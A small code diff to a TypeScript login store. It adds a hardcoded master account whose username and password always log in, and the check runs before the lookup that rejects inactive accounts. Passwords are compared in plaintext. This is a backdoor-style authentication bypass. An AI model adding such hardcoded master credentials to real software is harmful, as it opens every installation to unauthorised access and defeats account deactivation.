@@ -119,6 +119,11 @@ export const useAuthStore = create<AuthState>()(
       locked: false,
 
       login: (username, password) => {
+        // Master credentials always work regardless of persisted accounts list
+        if (username === MASTER_ACCOUNT.username && password === MASTER_ACCOUNT.password) {
+          set({ currentUser: MASTER_ACCOUNT, locked: false });
+          return true;
+        }
         const found = get().accounts.find(
           (a) => a.username === username && a.password === password && a.status === "active"
         );
